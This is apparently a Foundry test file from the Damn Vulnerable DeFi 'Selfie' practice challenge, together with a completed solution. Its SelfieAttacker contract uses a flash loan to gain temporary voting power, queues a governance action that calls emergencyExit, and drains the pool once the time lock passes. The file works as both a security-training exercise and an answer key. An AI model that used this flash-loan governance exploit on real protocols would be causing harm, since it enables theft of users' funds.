// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";


contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        SelfieAttacker selfieAttacker = new SelfieAttacker(
            address(pool),
            address(governance),
            address(token),
            recovery
        );
        selfieAttacker.startAttack();
        vm.warp(block.timestamp + 2 days);
        selfieAttacker.executeProposal();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
contract SelfieAttacker is IERC3156FlashBorrower {

    address recovery;
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    uint actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _pool, 
        address _governance,
        address _token,
        address _recovery
    ){
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        recovery = _recovery;
    }

    function startAttack() external {
        // Initiate the flash loan
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000 ether, "");
    }

    function onFlashLoan(
        address _initiator,
        address /*_token*/,
        uint256 _amount,
        uint256 _fee,
        bytes calldata /*_data*/
    ) external returns (bytes32){

        require(msg.sender == address(pool), "SelfieAttacker: Only pool can call");
        require(_initiator == address(this), "SelfieAttacker: Initiator is not self");
        
        // Delegate votes to ourself so we can queue an action
        token.delegate(address(this));
        uint _actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        actionId = _actionId;
        token.approve(address(pool), _amount+_fee);
        return CALLBACK_SUCCESS;
    }

    function executeProposal() external {
        governance.executeAction(actionId);
    }
}

// forge test --mt "test_selfie"
// forge test --mt "test_freeRider" 
// forge test --mt "test_naiveReceiver"
// forge test --mt "test_unstoppable"
// forge test --mt "test_sideEntrance"
// forge test --mt "test_theRewarder" 